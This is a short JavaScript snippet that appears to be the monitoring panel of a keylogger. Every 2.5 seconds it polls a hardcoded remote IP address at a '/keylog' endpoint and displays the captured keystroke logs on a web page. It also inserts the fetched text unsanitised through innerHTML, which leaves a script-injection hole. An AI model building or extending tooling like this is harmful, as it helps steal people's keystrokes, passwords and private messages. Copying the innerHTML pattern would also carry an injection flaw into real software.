const logger = document.getElementById('logger');//<--The HTML element that will contain the logs

fetchData = async _ => {
    const data = await fetch('http://52.67.38.153:8080/keylog');//<-- GET to recieve the log
    const text = await data.text();//<--Transform the obtained to text
    logger.innerHTML = `Logs recibidos: ${text}`;//<-- Change the element innerHTML to the recieved log
}

setInterval(_ => { fetchData() }, 2500);//<--Executes the fetch over 2,5 segs 
